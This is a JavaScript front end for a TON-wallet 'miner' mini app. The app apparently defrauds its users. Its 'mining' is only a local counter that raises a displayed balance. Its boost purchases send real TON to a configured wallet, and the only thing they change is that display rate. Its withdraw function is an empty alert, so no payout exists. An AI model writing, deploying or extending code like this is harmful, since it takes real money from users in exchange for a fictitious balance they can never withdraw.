import { CONFIG } from "./config.js";

let balance = 0;
let rate = 0.000001;
let mining = false;

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
manifestUrl: "https://ton-miner.github.io/miniapp/tonconnect-manifest.json"
});

window.connectWallet = async () => {
  await tonConnectUI.connectWallet();
};

window.startMining = () => {
  if(mining) return;
  mining = true;

  setInterval(()=>{
    balance += rate;
    document.getElementById("balance").innerText = balance.toFixed(6);
  },1000);
};

window.buyBoost = async (amount) => {

  const tx = {
    validUntil: Math.floor(Date.now()/1000)+600,
    messages:[
      {
        address: CONFIG.WALLET,
        amount: (amount*1000000000).toString()
      }
    ]
  };

  try{
    await tonConnectUI.sendTransaction(tx);

    if(amount === 5){
      rate += 0.000005787;
    }
    if(amount === 15){
      rate += 0.000015787;
    }

    alert("Boost activated!");
  }catch{
    alert("Payment cancelled");
  }
};

window.withdraw = () => {
  alert("Withdraw later via backend");
};
